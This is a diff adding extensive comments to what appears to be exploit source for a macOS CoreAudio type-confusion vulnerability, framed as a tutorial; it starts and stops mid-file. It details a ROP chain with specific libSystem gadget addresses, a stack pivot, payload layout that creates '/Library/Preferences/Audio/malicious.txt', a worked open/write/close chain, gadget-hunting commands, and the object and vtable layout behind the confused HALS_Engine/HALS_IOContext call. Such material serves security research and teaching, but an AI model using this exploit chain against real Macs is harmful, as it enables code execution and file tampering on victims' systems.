+ *     0x7ff810b908a4 : xchg rsp, rax ; xor edx, edx ; ret      <-- SELECTED
+ *     0x7ff810b912c0 : xchg rsp, rax ; mov eax, 0x1 ; ret
+ *     0x7ff810b91abc : xchg rsp, rax ; xor eax, eax ; ret      (clobbers rax!)
+ *     ... etc
+ *
+ *   WHY THIS ONE:
+ *     - Clean pivot with minimal side effects
+ *     - Only clobbers EDX (zeroes it), which we don't need preserved
+ *     - Some alternatives clobber EAX which breaks syscall number setup
+ *     - The "xor edx, edx" is actually helpful - zeroes a register safely
+ *
+ *   ALTERNATIVES CONSIDERED:
+ *     - "mov rsp, rax ; ret" - These are much rarer in practice
+ *     - "push rax ; pop rsp ; ret" - Two instructions, same effect
+ *     - "leave ; ret" - Only works if RBP is controlled (not our case)
+ *
+ *   GOTCHAS:
+ *     - RAX MUST point to valid writable memory when this executes
+ *     - Stack must be set up BEFORE the pivot (our payload layout)
+ *     - After pivot, RSP points to our ROP chain, RAX has old stack
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #2: POP_RDI_GADGET (0x7ff80f185186)                                  │
+ * │ Instruction: pop rdi ; ret                                                  │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Control the first syscall argument (RDI in x86-64 calling convention).
+ *     For open(), RDI = pointer to filename string.
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "pop rdi ; ret$"
+ *
+ *     The $ anchor ensures we get clean gadgets ending in ret, not
+ *     "pop rdi ; ret ; something_else" which could cause issues.
+ *
+ *   CANDIDATES FOUND: ~50+ matches
+ *     These are VERY common gadgets because function epilogues often
+ *     restore callee-saved registers before returning.
+ *
+ *   WHY THIS ONE:
+ *     - Absolutely clean: just "pop rdi" then "ret"
+ *     - No side effects on other registers
+ *     - Good address alignment (ends in 0x86, no null bytes)
+ *     - Located in stable library (libSystem won't change often)
+ *
+ *   ALTERNATIVES CONSIDERED:
+ *     - "pop rdi ; pop rbp ; ret" - Works but needs extra padding
+ *     - "pop rdi ; xor eax, eax ; ret" - Clobbers RAX, bad for syscall
+ *     - "mov rdi, rax ; ret" - Different approach, less flexible
+ *
+ *   STACK LAYOUT WHEN USED:
+ *     [POP_RDI_GADGET addr]   <-- RSP points here
+ *     [value to load into RDI] <-- gets popped into RDI
+ *     [next gadget addr]       <-- ret jumps here
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #3: POP_RSI_GADGET (0x7ff811fa1e36)                                  │
+ * │ Instruction: pop rsi ; ret                                                  │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Control the second syscall argument (RSI).
+ *     For open(), RSI = flags (O_CREAT | O_WRONLY = 0x201).
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "pop rsi ; ret$"
+ *
+ *   CANDIDATES FOUND: ~30 matches
+ *     Slightly less common than pop rdi because RSI isn't always
+ *     a callee-saved register in all calling conventions.
+ *
+ *   WHY THIS ONE:
+ *     - Clean gadget, no side effects
+ *     - Stable address in libSystem
+ *     - No null bytes in address (important for string-based overflows,
+ *       though not critical for our Mach message payload)
+ *
+ *   USAGE IN CHAIN:
+ *     After setting up RDI with the filename pointer, we use this
+ *     to set RSI = 0x201 for the open() flags.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #4: POP_RDX_GADGET (0x7ff811cce418)                                  │
+ * │ Instruction: pop rdx ; ret                                                  │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Control the third syscall argument (RDX).
+ *     For open(), RDX = mode (0644 = 0x1A4).
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "pop rdx ; ret$"
+ *
+ *   CANDIDATES FOUND: ~20 matches
+ *     Less common than pop rdi/rsi because RDX is often used as a
+ *     scratch register and not saved across calls.
+ *
+ *   WHY THIS ONE:
+ *     - Clean, simple gadget
+ *     - RDX control is essential for syscalls with 3+ arguments
+ *
+ *   NOTE ON STACK PIVOT INTERACTION:
+ *     Our STACK_PIVOT_GADGET does "xor edx, edx" which zeroes EDX.
+ *     This is fine because we SET RDX later in the chain with this
+ *     POP_RDX gadget. Order matters!
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #5: POP_RAX_GADGET (0x7ff811c93b09)                                  │
+ * │ Instruction: pop rax ; ret                                                  │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Set the syscall number. On macOS x86-64, RAX holds the syscall
+ *     number (with 0x2000000 prefix for BSD syscalls).
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "pop rax ; ret$"
+ *
+ *   CANDIDATES FOUND: ~40 matches
+ *     Common because RAX is the return value register.
+ *
+ *   WHY THIS ONE:
+ *     - Must be used LAST before syscall (nothing should clobber RAX)
+ *     - Clean gadget ensures RAX has exactly our syscall number
+ *
+ *   CRITICAL PLACEMENT:
+ *     In the ROP chain, this MUST come right before the SYSCALL gadget:
+ *       ...
+ *       [POP_RAX_GADGET]
+ *       [0x2000005]        <- SYS_open
+ *       [SYSCALL]
+ *
+ *   GOTCHA - CLOBBERING:
+ *     Be careful not to use gadgets that modify RAX between POP_RAX
+ *     and SYSCALL. This is a common mistake!
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #6: ADD_HEX30_RSP (0x7ff80f17d035)                                   │
+ * │ Instruction: add rsp, 0x30 ; pop rbp ; ret                                  │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Skip over inline data embedded in the ROP payload. Our filename
+ *     string is placed directly in the payload, and we need to jump
+ *     over it to continue execution.
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "add rsp, 0x"
+ *
+ *   CANDIDATES FOUND: Various sizes (0x8, 0x10, 0x18, 0x20, 0x28, 0x30, etc.)
+ *     - add rsp, 0x8 ; ret
+ *     - add rsp, 0x10 ; pop rbp ; ret
+ *     - add rsp, 0x20 ; pop rbp ; ret
+ *     - add rsp, 0x30 ; pop rbp ; ret    <-- SELECTED
+ *     - add rsp, 0x48 ; pop rbp ; ret
+ *
+ *   WHY 0x30 SPECIFICALLY:
+ *     Our inline string is 41 bytes ("/Library/Preferences/Audio/malicious.txt\0").
+ *     We need to skip past it plus any padding for alignment.
+ *
+ *     Calculation:
+ *       String: 41 bytes
+ *       Padding to 8-byte align: 7 bytes
+ *       Total: 48 bytes = 0x30
+ *
+ *     The 0x30 gadget skips exactly the right amount!
+ *
+ *   DEALING WITH "pop rbp":
+ *     This gadget has a side effect: "pop rbp".
+ *     After adding 0x30 to RSP, it pops 8 more bytes into RBP.
+ *
+ *     Stack layout accounting for this:
+ *       [ADD_HEX30_RSP addr]
+ *       [41 bytes string]
+ *       [7 bytes padding]           <- 0x30 bytes total
+ *       [8 bytes dummy for pop rbp] <- popped into RBP (we use 0x42424242...)
+ *       [next gadget addr]          <- ret goes here
+ *
+ *   ALTERNATIVE APPROACH:
+ *     Could use multiple smaller "add rsp" gadgets, but one clean
+ *     jump is simpler and more reliable.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #7: LOAD_RSP_PLUS_EIGHT (0x7ffd1491ac80)                             │
+ * │ Instruction: lea rax, [rsp + 8] ; ret                                       │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Get a pointer to the inline string. The string is embedded directly
+ *     after this gadget's address in our payload, so [RSP + 8] points to it.
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "lea rax.*rsp"
+ *     $ ROPgadget --binary /System/Library/Frameworks/CoreAudio.framework/CoreAudio | grep "lea rax.*rsp"
+ *
+ *   WHY THIS IS CLEVER:
+ *     The classic ROP problem: how do you get a pointer to a string
+ *     when ASLR randomizes all addresses?
+ *
+ *     Solutions:
+ *       1. Leak an address and calculate (complex, needs info leak)
+ *       2. Use a fixed address (breaks with ASLR)
+ *       3. Calculate relative to current RSP (THIS IS WHAT WE DO)
+ *
+ *     By using "lea rax, [rsp + 8]", we get a pointer to whatever
+ *     follows this gadget on the stack. We PUT the string there!
+ *
+ *   PAYLOAD LAYOUT:
+ *     [LOAD_RSP_PLUS_EIGHT]    <- RSP points here when gadget runs
+ *     [ADD_HEX30_RSP]          <- RSP + 8 (this is where LEA points)
+ *     ["/Library/Pref..."]     <- The actual string
+ *
+ *     Wait, that means RAX points to ADD_HEX30_RSP's address, not the string!
+ *
+ *     CORRECTION - actual layout:
+ *     [LOAD_RSP_PLUS_EIGHT]    <- Gadget address
+ *     [string starts here]     <- RSP + 8 after gadget pops its own addr
+ *
+ *     When "lea rax, [rsp + 8]" executes:
+ *       - RSP points to the gadget address (just popped by previous ret)
+ *       - RSP + 8 is the next slot, where we placed the string
+ *       - RAX now holds pointer to our string!
+ *
+ *   NOTE ON ADDRESS:
+ *     This gadget (0x7ffd1491ac80) is from a different library than
+ *     the others. Finding good "lea rax, [rsp+N]" gadgets requires
+ *     searching multiple binaries.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #8: MOV_RAX_TO_RSI (0x7ff80f41b060)                                  │
+ * │ Instruction: mov rsi, rax ; mov rax, rsi ; pop rbp ; ret                    │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Move the string pointer (currently in RAX from the LEA gadget)
+ *     into RSI as an intermediate step toward getting it into RDI.
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "mov rsi, rax"
+ *
+ *   WHY NEEDED - THE REGISTER SHUFFLE:
+ *     We have: RAX = pointer to string (from LEA gadget)
+ *     We need: RDI = pointer to string (for open() first arg)
+ *
+ *     Problem: No clean "mov rdi, rax ; ret" gadget available!
+ *
+ *     Solution: Chain multiple moves:
+ *       RAX -> RSI (this gadget)
+ *       RSI -> RDI (next gadget)
+ *
+ *   ANALYZING THE SIDE EFFECTS:
+ *     "mov rsi, rax"      - Good: RSI now has our pointer
+ *     "mov rax, rsi"      - Neutral: RAX still has the pointer
+ *     "pop rbp"           - Must account for: need 8 bytes padding
+ *     "ret"               - Good: continues chain
+ *
+ *   STACK LAYOUT:
+ *     [MOV_RAX_TO_RSI addr]
+ *     [0x4242424242424242]    <- Dummy value for pop rbp
+ *     [next gadget addr]
+ *
+ *   GOTCHA:
+ *     The "pop rbp" means we MUST add padding after this gadget!
+ *     Forgetting this is a classic ROP chain bug.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #9: MOV_RSI_TO_RDI (0x7ff827af146d)                                  │
+ * │ Instruction: mov rdi, rsi ; mov rax, rdi ; mov rdx, rdi ; ret              │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Complete the register shuffle - move string pointer from RSI to RDI.
+ *     After this, RDI = pointer to "/Library/Preferences/Audio/malicious.txt"
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "mov rdi, rsi"
+ *
+ *   ANALYZING THE SIDE EFFECTS:
+ *     "mov rdi, rsi"      - Good: RDI now has our string pointer!
+ *     "mov rax, rdi"      - Side effect: RAX = string pointer (we'll overwrite)
+ *     "mov rdx, rdi"      - Side effect: RDX = string pointer (we'll overwrite)
+ *     "ret"               - Good: continues chain
+ *
+ *   WHY SIDE EFFECTS ARE OK:
+ *     Both RAX and RDX get clobbered with the string pointer.
+ *     BUT we set them AFTER this gadget with POP_RAX and POP_RDX!
+ *
+ *     Chain order:
+ *       [MOV_RSI_TO_RDI]    <- RDI set, RAX/RDX clobbered (OK)
+ *       [POP_RSI_GADGET]
+ *       [0x201]             <- RSI = flags (overwrites old RSI)
+ *       [POP_RDX_GADGET]
+ *       [0x1A4]             <- RDX = mode (overwrites clobbered value)
+ *       [POP_RAX_GADGET]
+ *       [0x2000005]         <- RAX = syscall (overwrites clobbered value)
+ *       [SYSCALL]
+ *
+ *   KEY INSIGHT:
+ *     The order of gadgets matters! Set registers that might get
+ *     clobbered LAST, right before the syscall.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #10: SYSCALL (0x7ff80f1534d0)                                        │
+ * │ Instruction: syscall ; ret                                                  │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Actually invoke the kernel to perform the open() syscall.
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "syscall"
+ *
+ *   CANDIDATES FOUND:
+ *     - syscall ; ret                              <- SELECTED
+ *     - syscall ; mov rdi, rax ; ret
+ *     - syscall ; test eax, eax ; jne ... ; ret
+ *
+ *   WHY "syscall ; ret":
+ *     - Cleanest form - just syscall then return
+ *     - The "ret" lets us continue the ROP chain after the syscall
+ *     - Could chain multiple syscalls (open, write, close)
+ *
+ *   ON macOS:
+ *     The syscall instruction works the same as Linux x86-64.
+ *     The only difference is the syscall NUMBER encoding:
+ *       - macOS: 0x2000000 | syscall_num for BSD syscalls
+ *       - Linux: just syscall_num
+ *
+ *   WHAT HAPPENS:
+ *     When "syscall" executes with our setup:
+ *       RAX = 0x2000005 (SYS_open)
+ *       RDI = pointer to "/Library/Preferences/Audio/malicious.txt"
+ *       RSI = 0x201 (O_CREAT | O_WRONLY)
+ *       RDX = 0x1A4 (0644 permissions)
+ *
+ *     Kernel creates the file, returns file descriptor in RAX.
+ *     "ret" continues to next gadget (or ends chain).
+ *
+ * =============================================================================
+ * GADGET SELECTION PRINCIPLES
+ * =============================================================================
+ *
+ * 1. MINIMIZE SIDE EFFECTS
+ * ────────────────────────
+ *    Every gadget does MORE than you want. The goal is to find ones
+ *    where the extra instructions don't break your chain.
+ *
+ *    BAD:  "pop rdi ; xor rax, rax ; ret"  (clobbers RAX!)
+ *    GOOD: "pop rdi ; ret"
+ *
+ *    Sometimes you can't avoid side effects. In that case, either:
+ *      a) Set the clobbered register AFTER this gadget
+ *      b) Ensure the clobbered value isn't needed
+ *
+ * 2. ACCOUNT FOR REGISTER CLOBBERING
+ * ───────────────────────────────────
+ *    Order matters! If gadget A sets RDI, don't use gadget B that
+ *    clobbers RDI before the syscall.
+ *
+ *    PRO TIP: Build your chain BACKWARDS from the syscall.
+ *
+ *    Start with: "What state do I need at syscall?"
+ *      RAX = syscall number (set this LAST)
+ *      RDI = arg1
+ *      RSI = arg2
+ *      RDX = arg3
+ *
+ *    Then work backwards: "What gadget sets RAX? What does it clobber?"
+ *    Continue until you reach the stack pivot.
+ *
+ * 3. STACK ALIGNMENT (16-BYTE ON x86-64)
+ * ──────────────────────────────────────
+ *    Some functions and syscalls crash if RSP isn't 16-byte aligned.
+ *    The ABI requires 16-byte alignment at function calls.
+ *
+ *    Solutions:
+ *      a) Add a bare "ret" gadget to adjust by 8 bytes
+ *      b) Use gadgets with even number of pops
+ *      c) Carefully count your stack operations
+ *
+ *    Syscalls themselves are usually OK with any alignment, but
+ *    if your ROP chain calls library functions, watch out!
+ *
+ * 4. DEALING WITH "pop rbp"
+ * ─────────────────────────
+ *    Many useful gadgets have "pop rbp" in the middle because
+ *    they come from function epilogues.
+ *
+ *    Solution: Add 8 bytes of padding (dummy value that gets popped).
+ *
+ *    Stack layout example:
+ *      [gadget addr]               <- RSP after ret
+ *      [8 bytes padding]           <- gets popped into RBP (don't care)
+ *      [next gadget addr]          <- ret continues here
+ *
+ *    Common padding values:
+ *      0x4141414141414141  ("AAAAAAAA" - easy to spot in debugger)
+ *      0x4242424242424242  ("BBBBBBBB" - what we use)
+ *      0xdeadbeefdeadbeef  (classic placeholder)
+ *
+ * 5. ADDRESS STABILITY
+ * ────────────────────
+ *    Prefer gadgets in stable, core libraries:
+ *
+ *    STABLE (good):
+ *      /usr/lib/libSystem.B.dylib
+ *      /usr/lib/system/libsystem_c.dylib
+ *      /usr/lib/system/libsystem_kernel.dylib
+ *
+ *    LESS STABLE (use with caution):
+ *      Framework binaries (may change between minor updates)
+ *      App-specific libraries
+ *
+ *    CRITICAL: Document which macOS version your addresses are for!
+ *
+ *    These addresses are for: macOS [VERSION] build [BUILD_NUMBER]
+ *    They WILL break on other versions. That's expected.
+ *
+ * 6. TOOL COMPARISON
+ * ──────────────────
+ *    Different tools find different gadgets. Use multiple!
+ *
+ *    ROPgadget (Python):
+ *      + Most comprehensive
+ *      + Good regex search
+ *      + Handles multiple architectures
+ *      - Slower on large binaries
+ *      $ ROPgadget --binary /path/to/binary
+ *
+ *    Ropper (Python):
+ *      + Faster than ROPgadget
+ *      + Interactive mode
+ *      + Semantic search ("find gadgets that set rdi")
+ *      $ ropper -f /path/to/binary --search "pop rdi"
+ *
+ *    radare2 (/R command):
+ *      + Integrated with full reversing suite
+ *      + Fast
+ *      + Can search in memory of running process
+ *      $ r2 /path/to/binary
+ *      [0x00000000]> /R pop rdi
+ *
+ *    TIP: When ROPgadget misses something, try Ropper.
+ *         When both miss, try radare2's /R in different modes.
+ *
+ * 7. NULL BYTE CONSIDERATIONS
+ * ───────────────────────────
+ *    If your payload goes through string functions (strcpy, etc.),
+ *    null bytes (0x00) will terminate the copy early.
+ *
+ *    Check your gadget addresses:
+ *      0x7ff80f185186 - OK (no null bytes)
+ *      0x7ff800185186 - PROBLEM (contains 0x00)
+ *
+ *    For our Mach message exploit, this isn't critical because
+ *    we control the exact byte count. But it matters for many
+ *    stack buffer overflow exploits.
+ *
+ * =============================================================================
+ * WORKED EXAMPLE: BUILDING A "WRITE STRING TO FILE" ROP CHAIN
+ * =============================================================================
+ *
+ * Let's walk through building a complete chain that:
+ *   1. Opens a file
+ *   2. Writes a message to it
+ *   3. Closes the file
+ *
+ * STEP 1: IDENTIFY NEEDED SYSCALLS
+ * ─────────────────────────────────
+ *   open(path, O_CREAT|O_WRONLY, 0644)  -> returns fd in RAX
+ *   write(fd, message, length)          -> needs fd from open
+ *   close(fd)                           -> cleanup
+ *
+ *   Syscall numbers (macOS):
+ *     SYS_open  = 0x2000005
+ *     SYS_write = 0x2000004
+ *     SYS_close = 0x2000006
+ *
+ * STEP 2: IDENTIFY REGISTER REQUIREMENTS
+ * ──────────────────────────────────────
+ *   open():  RDI=path, RSI=flags, RDX=mode, RAX=0x2000005
+ *   write(): RDI=fd, RSI=buffer, RDX=length, RAX=0x2000004
+ *   close(): RDI=fd, RAX=0x2000006
+ *
+ * STEP 3: PLAN THE DATA
+ * ─────────────────────
+ *   Need two strings in payload:
+ *     - Filename: "/tmp/pwned.txt\0" (15 bytes)
+ *     - Message:  "Hello from ROP!\n\0" (17 bytes)
+ *
+ * STEP 4: DESIGN CHAIN (work backwards from each syscall)
+ * ───────────────────────────────────────────────────────
+ *
+ *   === PART A: open() ===
+ *
+ *   Goal state before syscall:
+ *     RAX = 0x2000005
+ *     RDI = &filename
+ *     RSI = 0x201
+ *     RDX = 0x1A4
+ *
+ *   Chain (backwards):
+ *     SYSCALL                          <- executes open
+ *     POP_RAX + 0x2000005              <- set syscall num (LAST!)
+ *     POP_RDX + 0x1A4                  <- set mode
+ *     POP_RSI + 0x201                  <- set flags
+ *     (gadgets to get &filename->RDI)  <- see next
+ *
+ *   For filename pointer:
+ *     LEA_RAX_RSP8                     <- RAX = &(inline filename)
+ *     MOV_RSI_RAX + padding            <- RSI = RAX
+ *     MOV_RDI_RSI                      <- RDI = RSI
+ *
+ *   === PART B: Preserve fd (tricky!) ===
+ *
+ *   After open(), RAX contains the file descriptor.
+ *   We need it for write() and close().
+ *
+ *   Options:
+ *     a) Store fd in a preserved register (R12-R15)
+ *        Need: "mov r12, rax ; ret" or "push rax ; pop r12 ; ret"
+ *     b) Store fd in memory
+ *        Need: "mov [rsp+N], rax ; ret" then later "mov rdi, [rsp+N]"
+ *     c) Hope RAX survives (risky!)
+ *
+ *   For this example, assume we found: "mov r12, rax ; ret"
+ *
+ *   Chain addition after open syscall:
+ *     MOV_R12_RAX                      <- save fd to R12
+ *
+ *   === PART C: write() ===
+ *
+ *   Goal state:
+ *     RAX = 0x2000004
+ *     RDI = fd (from R12)
+ *     RSI = &message
+ *     RDX = 16 (message length)
+ *
+ *   Chain:
+ *     (gadgets to get &message->RSI)   <- inline message trick again
+ *     MOV_RDI_R12                      <- RDI = saved fd
+ *     POP_RDX + 16                     <- set length
+ *     POP_RAX + 0x2000004              <- set syscall num
+ *     SYSCALL                          <- executes write
+ *
+ *   === PART D: close() ===
+ *
+ *   Goal state:
+ *     RAX = 0x2000006
+ *     RDI = fd (from R12)
+ *
+ *   Chain:
+ *     MOV_RDI_R12                      <- RDI = saved fd
+ *     POP_RAX + 0x2000006              <- set syscall num
+ *     SYSCALL                          <- executes close
+ *
+ * STEP 5: ASSEMBLE FINAL PAYLOAD
+ * ──────────────────────────────
+ *
+ *   Offset  Content
+ *   ------  -------
+ *   0x000   [Stack pivot gadget addr]     <- Entry point
+ *   ...     (alignment to ROP start)
+ *
+ *   --- ROP chain for open() ---
+ *   0x???   [LEA_RAX_RSP8]
+ *   0x???   [ADD_RSP_0x20]                 <- skip filename
+ *   0x???   "/tmp/pwned.txt\0" + padding   <- inline filename (0x20 bytes)
+ *   0x???   [rbp padding]
+ *   0x???   [MOV_RSI_RAX]
+ *   0x???   [rbp padding]
+ *   0x???   [MOV_RDI_RSI]
+ *   0x???   [POP_RSI] + [0x201]
+ *   0x???   [POP_RDX] + [0x1A4]
+ *   0x???   [POP_RAX] + [0x2000005]
+ *   0x???   [SYSCALL]
+ *
+ *   --- Save fd ---
+ *   0x???   [MOV_R12_RAX]
+ *
+ *   --- ROP chain for write() ---
+ *   0x???   [LEA_RAX_RSP8]
+ *   0x???   [ADD_RSP_0x20]                 <- skip message
+ *   0x???   "Hello from ROP!\n\0" + pad    <- inline message
+ *   0x???   [rbp padding]
+ *   0x???   [MOV_RSI_RAX]
+ *   0x???   [rbp padding]
+ *   0x???   [MOV_RDI_R12]                  <- fd into RDI
+ *   0x???   [POP_RDX] + [16]               <- message length
+ *   0x???   [POP_RAX] + [0x2000004]
+ *   0x???   [SYSCALL]
+ *
+ *   --- ROP chain for close() ---
+ *   0x???   [MOV_RDI_R12]
+ *   0x???   [POP_RAX] + [0x2000006]
+ *   0x???   [SYSCALL]
+ *
+ *   --- Clean exit (optional) ---
+ *   0x???   [POP_RDI] + [0]                <- exit code
+ *   0x???   [POP_RAX] + [0x2000001]        <- SYS_exit
+ *   0x???   [SYSCALL]
+ *
+ * STEP 6: TEST AND DEBUG
+ * ──────────────────────
+ *
+ *   Common issues:
+ *     - Stack misalignment: Add/remove "ret" gadgets
+ *     - Wrong offsets: Verify inline string positions
+ *     - Clobbered registers: Check gadget side effects
+ *     - Bad addresses: Confirm library versions match
+ *
+ *   Debugging tips:
+ *     - Use lldb/gdb to single-step through ROP chain
+ *     - Set breakpoints on each gadget address
+ *     - Watch register values between gadgets
+ *     - Check RSP progression matches your layout
+ *
+ * =============================================================================
+ * COMMON MISTAKES AND HOW TO AVOID THEM
+ * =============================================================================
+ *
+ * MISTAKE #1: Forgetting pop rbp padding
+ * ──────────────────────────────────────
+ *   Symptom: Chain jumps to wrong address
+ *   Cause: Gadget has "pop rbp" you didn't account for
+ *   Fix: Add 8 bytes of padding after the gadget address
+ *
+ * MISTAKE #2: Register clobbering order
+ * ─────────────────────────────────────
+ *   Symptom: Syscall fails or wrong arguments
+ *   Cause: Later gadget overwrites earlier-set register
+ *   Fix: Set easily-clobbered registers (RAX, RDX) LAST
+ *
+ * MISTAKE #3: Wrong inline string offset
+ * ──────────────────────────────────────
+ *   Symptom: Path or message is garbage/truncated
+ *   Cause: LEA offset doesn't match actual string position
+ *   Fix: Manually verify string placement in hex dump
+ *
+ * MISTAKE #4: Forgetting null terminator
+ * ──────────────────────────────────────
+ *   Symptom: Extra garbage in filename/string
+ *   Cause: String not null-terminated
+ *   Fix: Always add \x00 after string: b"filename\x00"
+ *
+ * MISTAKE #5: Hardcoding addresses without version check
+ * ───────────────────────────────────────────────────────
+ *   Symptom: Exploit works on your machine, fails elsewhere
+ *   Cause: Gadget addresses change between macOS versions
+ *   Fix: Document exact version, provide gadget-finding script
  *
  * -----------------------------------------------------------------------------
  * L.3 x86-64 SYSCALL CONVENTION
@@ -10582,6 +11906,15 @@ int main(int argc, char *argv[]) {
  * =============================================================================
  * =============================================================================
  *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: Intermediate                                                  │
+ * │ PREREQUISITES: IPC basics, C++ classes                                  │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • HAL architecture                                                    │
+ * │   • HALS objects                                                        │
+ * │   • MIG subsystem                                                       │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
  * To exploit a system, you must first understand it deeply. This section
  * provides a comprehensive analysis of the CoreAudio architecture from
  * the perspective of a security researcher.
@@ -10906,6 +12239,136 @@ int main(int argc, char *argv[]) {
  *
  * The vulnerability: _XIOContext_Fetch_Workgroup_Port expects 'ioct' but
  * doesn't verify the type before dereferencing offset 0x68/0x70.
+ *
+ * -----------------------------------------------------------------------------
+ * COMPLETE HALS OBJECT TYPE CODES
+ * -----------------------------------------------------------------------------
+ *
+ * All known HALS_Object FourCC type identifiers (reverse engineered from
+ * CoreAudio framework binaries and runtime inspection):
+ *
+ *   FourCC          Hex Value       Class Name                  Notes
+ *   ──────          ─────────       ──────────                  ─────
+ *   'syst'          0x73797374      HALS_System                 Singleton, manages all audio
+ *   'adev'          0x61646576      HALS_Device                 Physical/virtual audio device
+ *   'strm'          0x7374726D      HALS_Stream                 Audio stream on a device
+ *   'ioct'          0x696F6374      HALS_IOContext              I/O processing context
+ *   'ngne'          0x6E676E65      HALS_Engine                 Audio processing engine <-- CONFUSION SOURCE
+ *   'trpm'          0x7472706D      HALS_TransportManager       Transport control manager
+ *   'agrp'          0x61677270      HALS_AudioAggregateDevice   Multi-device aggregate
+ *   'box '          0x626F7820      HALS_Box                    Hardware box/chassis
+ *   'ctrl'          0x6374726C      HALS_Control                Mixer control (volume, etc.)
+ *   'clnt'          0x636C6E74      HALS_Client                 Client connection state
+ *   'plug'          0x706C7567      HALS_PlugIn                 Audio plugin container
+ *   'ddev'          0x64646576      HALS_DefaultDevice          Default device wrapper
+ *   'tap '          0x74617020      HALS_Tap                    Audio tap (monitoring)
+ *   'engi'          0x656E6769      HALS_Engine (variant)       Alternative engine code
+ *   'proc'          0x70726F63      HALS_Process                Audio processing unit
+ *   'aupn'          0x6175706E      HALS_AudioUnitPlugIn        AudioUnit plugin wrapper
+ *   'subd'          0x73756264      HALS_SubDevice              Sub-device component
+ *
+ * FOURCC BYTE ORDER NOTE:
+ *
+ *   FourCC codes are stored in BIG ENDIAN order in memory, meaning 'syst'
+ *   appears as: 0x73 0x79 0x73 0x74 = 's' 'y' 's' 't'
+ *
+ *   When read as a 32-bit little-endian integer (x86/ARM):
+ *     'syst' = 0x74737973
+ *     'ngne' = 0x656E676E
+ *     'ioct' = 0x74636F69
+ *
+ *   Verification command:
+ *     (lldb) memory read -s4 -fx obj+0x18 -c1
+ *
+ * CLASS HIERARCHY WITH VTABLE SIZES:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │   HALS_Object (base)                                                   │
+ *   │   vtable: ~32 entries (256 bytes on 64-bit)                           │
+ *   │   size: 0x28 bytes (base fields only)                                  │
+ *   │                                                                         │
+ *   │   Virtual methods (partial list):                                       │
+ *   │     [0]  destructor                                                    │
+ *   │     [1]  destructor (deleting)                                         │
+ *   │     [2]  GetObjectID()                                                 │
+ *   │     [3]  GetType()                                                     │
+ *   │     [4]  GetOwner()                                                    │
+ *   │     [5]  Release()                                                     │
+ *   │     [6]  Retain()                                                      │
+ *   │     [7]  GetPropertyData()                                             │
+ *   │     [8]  SetPropertyData()                                             │
+ *   │     [9]  HasProperty()                                                 │
+ *   │     ...                                                                │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *            │
+ *            ├─────────────────────────────────────────────────────────────┐
+ *            │                                                             │
+ *            ▼                                                             ▼
+ *   ┌─────────────────────────────────┐              ┌─────────────────────────────────┐
+ *   │   HALS_IOContext ('ioct')       │              │   HALS_Engine ('ngne')          │
+ *   │   vtable: ~48 entries           │              │   vtable: ~40 entries           │
+ *   │   size: 0x120 bytes (~288)      │              │   size: 0x480 bytes (~1152)     │
+ *   │                                  │              │                                  │
+ *   │   Additional methods:           │              │   Additional methods:           │
+ *   │     [32] StartIO()              │              │     [32] Start()                │
+ *   │     [33] StopIO()               │              │     [33] Stop()                 │
+ *   │     [34] GetWorkInterval()      │              │     [34] GetCycleInfo()         │
+ *   │     [35] FetchWorkgroupPort() ◀═╪══════════════╪═══ CALLED ON WRONG TYPE!       │
+ *   │     [36] SetClientPort()        │              │     [35] SetTap()               │
+ *   │     [37] InvalidateIO()         │              │     [36] GetBuffer()            │
+ *   │     ...                         │              │     ...                         │
+ *   │                                  │              │                                  │
+ *   │   Key field: 0x68 = workgroup_ptr              │   Key field: 0x68 = ???         │
+ *   │              (valid pointer)    │              │   (UNINITIALIZED/GARBAGE)       │
+ *   └─────────────────────────────────┘              └─────────────────────────────────┘
+ *
+ * OTHER CONFUSABLE TYPE PAIRS:
+ *
+ * Type confusion requires two objects with similar allocation sizes but
